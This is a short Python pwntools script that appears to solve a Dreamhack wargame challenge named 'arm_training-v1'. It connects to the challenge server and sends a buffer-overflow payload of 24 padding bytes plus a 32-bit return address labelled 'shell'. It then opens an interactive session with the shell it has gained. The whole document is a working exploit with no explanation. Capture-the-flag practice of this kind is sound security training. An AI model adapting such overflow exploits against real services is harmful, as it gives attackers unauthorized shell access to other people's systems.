from pwn import *

p = remote('host1.dreamhack.games', 10329)
elf = ELF('./arm_training-v1')

payload = b'a'*24;
shell = 0x10558;
payload += p32(shell)

p.send(payload)
p.interactive()
